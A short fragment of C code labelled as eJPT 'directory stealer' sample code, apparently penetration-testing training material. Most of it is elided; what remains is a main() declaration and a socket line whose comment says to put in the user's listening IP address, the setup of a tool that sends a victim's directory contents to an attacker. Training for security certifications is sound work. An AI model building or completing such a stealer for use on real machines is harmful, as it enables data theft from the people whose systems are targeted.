// eJPT Directory Stealer Sample Code - ** Not my Own ** //
...
int main() //declaration of the main function
{
    ...
    addr.sin_addr.s_addr = inet_addr("X.X.X.X"); /* specify the target of network connection - replace the ip with your listening ip address */
